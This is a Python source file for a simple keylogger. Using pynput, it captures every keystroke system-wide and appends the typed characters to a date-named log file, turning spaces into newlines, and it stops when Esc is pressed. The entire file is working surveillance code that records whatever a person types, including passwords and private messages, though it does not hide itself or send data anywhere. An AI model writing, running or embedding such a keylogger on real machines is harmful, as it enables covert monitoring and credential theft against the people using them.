import pynput
import os

from datetime import date
from pynput.keyboard import Key, Listener

#Date time variables for creating the log file
log_file_save_path = "logfiles/"
today = date.today()
log_file_name = today.strftime("%m-%d-%Y")
log_file_complete_path = os.path.join(log_file_save_path, log_file_name)

#Supporting variables for on press functionality
count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    #print("{0} pressed".format(key))

    if count > 20:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(log_file_complete_path + ".txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

def main():
    print(log_file_complete_path)
    f = open(log_file_complete_path + ".txt", "w+")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
if __name__ == "__main__":
    main()